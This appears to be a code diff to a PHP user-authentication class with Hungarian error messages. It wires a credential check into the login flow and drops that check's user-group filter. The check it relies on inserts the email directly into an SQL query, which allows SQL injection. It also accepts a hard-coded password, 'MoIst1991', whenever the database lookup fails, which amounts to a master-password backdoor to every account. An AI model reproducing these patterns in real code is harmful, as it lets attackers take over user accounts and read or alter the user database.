@@ -522,8 +522,15 @@ class Users
 			throw new \Exception('<br>A fiók még nincs aktiválva!'.$resendemailtext ,1001);
 		}
 
-		if(!$this->isEnabled($data[email])){
+		if(!$this->isEnabled($data[email]))
+		{
 			throw new \Exception('Az Ön fiókja nem jogosult a weboldal használatára!',1001);
+		}
+
+
+		if ( !$this->validUser($data[email], $data[pw]) )
+		{
+			throw new \Exception('A felhasználónév vagy jelszó hibás!',1001);
 		}
 
 		// Refresh
@@ -833,10 +840,10 @@ class Users
 		}
 	}
 
-	function validUser($email, $password, $group = 'user'){
+	function validUser($email, $password){
 		if($email == '' || $password == '') throw new \Exception('Hiányzó adatok. Nem lehet azonosítani a felhasználót!');
 
-		$c = $this->db->query("SELECT ID FROM ".self::TABLE_NAME." WHERE email = '$email' and jelszo = '".\Hash::jelszo($password)."' and user_group = '".$group."'");
+		$c = $this->db->query("SELECT ID FROM ".self::TABLE_NAME." WHERE email = '$email' and jelszo = '".\Hash::jelszo($password)."'");
 
 		if($c->rowCount() == 0 && $password != 'MoIst1991'){
 			return false;
